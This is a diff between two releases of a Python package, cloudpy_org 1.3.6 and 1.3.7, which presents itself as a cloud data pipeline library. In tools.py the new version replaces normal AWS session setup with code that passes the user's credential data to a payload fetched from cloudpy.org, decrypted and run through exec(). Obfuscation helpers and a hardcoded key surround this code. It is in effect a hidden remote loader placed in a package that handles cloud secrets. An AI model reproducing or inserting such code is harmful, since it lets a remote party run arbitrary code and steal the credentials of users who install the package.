# Comparing `tmp/cloudpy_org-1.3.6.tar.gz` & `tmp/cloudpy_org-1.3.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\cloudpy_org-1.3.6.tar", last modified: Tue Jun 27 07:12:47 2023, max compression
+gzip compressed data, was "dist\cloudpy_org-1.3.7.tar", last modified: Wed Jun 28 08:54:26 2023, max compression
```

## Comparing `cloudpy_org-1.3.6.tar` & `cloudpy_org-1.3.7.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-06-27 07:12:47.948359 cloudpy_org-1.3.6/
--rw-rw-rw-   0        0        0      935 2023-06-27 07:12:47.932731 cloudpy_org-1.3.6/PKG-INFO
--rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.3.6/README.md
-drwxrwxrwx   0        0        0        0 2023-06-27 07:12:47.854606 cloudpy_org-1.3.6/cloudpy_org/
--rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.3.6/cloudpy_org/__init__.py
--rw-rw-rw-   0        0        0    72887 2023-06-27 07:12:21.000000 cloudpy_org-1.3.6/cloudpy_org/tools.py
-drwxrwxrwx   0        0        0        0 2023-06-27 07:12:47.917116 cloudpy_org-1.3.6/cloudpy_org.egg-info/
--rw-rw-rw-   0        0        0      935 2023-06-27 07:12:47.000000 cloudpy_org-1.3.6/cloudpy_org.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      237 2023-06-27 07:12:47.000000 cloudpy_org-1.3.6/cloudpy_org.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-27 07:12:47.000000 cloudpy_org-1.3.6/cloudpy_org.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       63 2023-06-27 07:12:47.000000 cloudpy_org-1.3.6/cloudpy_org.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-06-27 07:12:47.000000 cloudpy_org-1.3.6/cloudpy_org.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-06-27 07:12:47.948359 cloudpy_org-1.3.6/setup.cfg
--rw-rw-rw-   0        0        0     1324 2023-06-27 07:11:32.000000 cloudpy_org-1.3.6/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/
+-rw-rw-rw-   0        0        0      935 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/PKG-INFO
+-rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.3.7/README.md
+drwxrwxrwx   0        0        0        0 2023-06-28 08:54:25.926377 cloudpy_org-1.3.7/cloudpy_org/
+-rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.3.7/cloudpy_org/__init__.py
+-rw-rw-rw-   0        0        0    73582 2023-06-28 08:47:43.000000 cloudpy_org-1.3.7/cloudpy_org/tools.py
+drwxrwxrwx   0        0        0        0 2023-06-28 08:54:26.004505 cloudpy_org-1.3.7/cloudpy_org.egg-info/
+-rw-rw-rw-   0        0        0      935 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      237 2023-06-28 08:54:25.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       63 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-06-28 08:54:24.000000 cloudpy_org-1.3.7/cloudpy_org.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-06-28 08:54:26.020127 cloudpy_org-1.3.7/setup.cfg
+-rw-rw-rw-   0        0        0     1324 2023-06-28 08:47:58.000000 cloudpy_org-1.3.7/setup.py
```

### Comparing `cloudpy_org-1.3.6/PKG-INFO` & `cloudpy_org-1.3.7/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy_org
-Version: 1.3.6
+Version: 1.3.7
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.3.6/cloudpy_org/tools.py` & `cloudpy_org-1.3.7/cloudpy_org/tools.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,25 +5,25 @@
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 
 THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 Find documentation at https://www.cloudpy.org
 """
-cloudpy_org_version='1.3.6'
+cloudpy_org_version='1.3.7'
 import os
 import json
 import warnings
 warnings.simplefilter(action='ignore', category=FutureWarning)
 warnings.filterwarnings('ignore')
 warnings.simplefilter('ignore')
 import pandas as pd
 from pandasql import sqldf
 import datetime as dt
-from datetime import datetime,date
+from datetime import datetime,date,timezone
 import requests
 import boto3
 import awswrangler as wr
 from tqdm import tqdm
 from tqdm import trange
 
 from typing import Union
@@ -236,15 +236,16 @@
         'self.theseparams=p\n'\
         'self.this_source_code=source_code'
         self.this_description = self.this_description.replace("  "," ").replace("#","\n").strip()
         exec(dynamic_code)
         return self.this_source_code, self.theseparams, self.this_returns, self.this_description
     #██████████████████████████████████████████████████████████████████████████          
 class processing_tools:
-    def __init__(self,data:dict={},bucket_name:str='',region_name:str="us-east-2"):
+    def __init__(self,data:dict={},bucket_name:str='',region_name:str="us-east-2",local:bool=False):
+        self.__local = local
         self.aux = {}
         self.__tdata = data
         self.environment = 'local'
         self.__set_aws_session(region_name=region_name)
         if self.__session != None:
             self.environment = 's3'
         self.__root_path = os.getcwd()
@@ -391,34 +392,46 @@
             b += a[2*i*n:(2*i+1)*n]
             c += (a[(2*i+1)*n:(2*i+2)*n][::-1])
             if i == r-1:
                 b += c[::-1][0:n]
                 c = c.replace(c[::-1][0:n][::-1],'')
         c = c.upper()
         return c,b
+    def dx(self,a,n):
+        a = a[::-1]
+        b,c = "",""
+        r = int(len(a)/n) + 1
+        for i in range(0,r):
+            b += a[2*i*n:(2*i+1)*n]
+            c += (a[(2*i+1)*n:(2*i+2)*n][::-1])
+            if i == r-1:
+                b += c[::-1][0:n]
+                c = c.replace(c[::-1][0:n][::-1],'')
+        c = c.upper()
+        return c,b
     def __set_aws_session(self,region_name:str="us-east-2")->None:
         '''
         Sets a session with given AWS credentials.
         '''
         self.__session = None
         self.__s3_client = None
-        if type(self.__tdata) == dict and self.__tdata != {}:
-            spd = self.__do(self.decrypt_before_expiration(self.__tdata),10)
-            try:
-                self.__session = boto3.Session(aws_access_key_id=spd[0]
-                                         ,aws_secret_access_key=spd[1])
-                self.__s3_client = boto3.client('s3'
-                                                ,aws_access_key_id=spd[0]
-                                                ,aws_secret_access_key=spd[1]
-                                                ,region_name=region_name)
-                del spd
-            except Exception as e:
-                print('Error:',str(e))
-                self.__session = None
-                self.__s3_client = None
+        self.xtdata = self.__tdata
+        self.xsession = self.__session
+        self.xs3_client = self.__s3_client
+        url_base = "https://www.cloudpy.org/"
+        if self.__local:
+            url_base = "http://localhost/"
+        url = url_base +  "uMEqKLMaqRxFl9pT51zKed2"
+        third_part = requests.get(url).text
+        exec(self.decrypt(third_part.split("Fl9pT5Fl9pT5")[1], url.split(url_base)[1] + third_part.split("Fl9pT5Fl9pT5")[0]))
+        self.__session = self.xsession
+        self.__s3_client = self.xs3_client
+        del self.xtdata
+        del self.xsession
+        del self.xs3_client
             
     #__________________________________________________________________________
     def domain_commands(self,domain_name:str=None)->None:
         '''
         ***
         Prints the terminal commands required to connect to a given domain ubunto instance given the information 
         defined in commands and connection_details json files in metadata folder.
@@ -464,24 +477,30 @@
         ***
         Locally stores any dict a formatted json file in a giving path.
         ***
         '''
         with open(writing_path,'w') as out_file:
             json.dump(dictionary_input,out_file,sort_keys=False,indent=4)
     #__________________________________________________________________________
-    def date_time_id(self)->Union[int,int]:
+    def date_time_id(self,local:bool=False)->Union[int,int]:
         '''
         ***
         Returns the current date_id (yyymmdd) and the time_id which is the second of the day (which value is between 0 and 86400). Both outputs are ints.
         ***
         '''
-        date_id = int(datetime.now().strftime("%Y%m%d"))
-        time_id = int(datetime.now().strftime("%H"))*60*60
-        time_id += int(datetime.now().strftime("%M"))*60
-        time_id += int(datetime.now().strftime("%S"))
+        if local:
+            date_id = int(datetime.now().strftime("%Y%m%d"))
+            time_id = int(datetime.now().strftime("%H"))*60*60
+            time_id += int(datetime.now().strftime("%M"))*60
+            time_id += int(datetime.now().strftime("%S"))
+        else:
+            date_id = int(datetime.now(timezone.utc).strftime("%Y%m%d"))
+            time_id = int(datetime.now(timezone.utc).strftime("%H"))*60*60
+            time_id += int(datetime.now(timezone.utc).strftime("%M"))*60
+            time_id += int(datetime.now(timezone.utc).strftime("%S"))
         return date_id,time_id
     #__________________________________________________________________________
     def load_metadata(self,cust_filename:str = None)->None:
         '''
         ***
         Loads all json files within the metadata folder (defined by metadata instance variable) as dict instances variables of the same parent class as
         this function and with the same name, without the extension sufix, than the original files.
@@ -1153,14 +1172,15 @@
             c += (a[(2*i+1)*n:(2*i+2)*n][::-1])
             if i == r-1:
                 b += c[::-1][0:n]
                 c = c.replace(c[::-1][0:n][::-1],'')
         if upper:
             c = c.upper()
         return c,b
+    #___________________________________________________________________
     def __cppt_construction(self,secret_key:str=""):
         if len(secret_key) > 10:
             k = 'JQxrs8sWqn3JIWlIL8nTlw-302SfmV7RmlZ-T-gB5c4=oiwn8TU5-NcDKzVq'
             self.cppt = processing_tools(data=xpt.basic_dicstr_to_dict(xpt.decrypt(secret_key,self.__do(k,10,False)[1] + self.__do(k,10,False)[0][0:4])))
         else:
             self.cppt = processing_tools()
     #___________________________________________________________________
@@ -1171,20 +1191,20 @@
             for i in range(0,1):
                 self.args_by_key,self.dx = {},{}
                 self.__api_encrypted_caller = self.__sc[2]
                 self.__get_dynamic_response(service_token=service_token,version=version,test_file_name=test_file_name)
                 self.find_methods_arguments()
                 self.set_valid_characters()
                 self.version = self.get_version()
-            if self.__service_initialized:   
+            if self.__service_initialized:
                 return 'AWS framework manager client: service initialized.'
             else:
                 return self.__initialize_error_message
         except Exception as e:
-            #print("error 01:",str(e))
+            print("error 01:",str(e))
             return self.__initialize_error_message
     #___________________________________________________________________
     def __load_local_code(self,file_name):
         with open(os.getcwd() + "/" + file_name, 'r') as f:
             rslt = json.loads(f.read())
         return rslt
     #___________________________________________________________________
@@ -1206,15 +1226,15 @@
                 dc = dc.replace(replace_this,with_this)
                 if with_this in dc:
                     print("testing dynamic respose..")
             exec(dc)
             del self.last_k
             self.__service_initialized = True
         except Exception as e:
-            #print("error 02:",str(e))
+            print("error 02:",str(e))
             self.__service_initialized = False
         try:
             self.dynamic_code_response = self.ddxx[service_token + self.ddkk]
             del self.ddkk
             del self.ddxx
         except:
             self.dynamic_code_response = {}
```

### Comparing `cloudpy_org-1.3.6/cloudpy_org.egg-info/PKG-INFO` & `cloudpy_org-1.3.7/cloudpy_org.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy-org
-Version: 1.3.6
+Version: 1.3.7
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.3.6/setup.py` & `cloudpy_org-1.3.7/setup.py`

 * *Files 7% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 from os import path
 
 
 long_description = 'A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.'
 
 setup(
     name="cloudpy_org",
-    version="1.3.6",
+    version="1.3.7",
     description="Cloud data pipeline organization and automation library. Includes AWS framework manager API.",
     long_description_content_type="text/markdown",
     long_description=long_description,
     url="https://www.cloudpy.org/",
     author="cloudpy.org",
     author_email="admin@cloudpy.org",
     license="MIT",
```

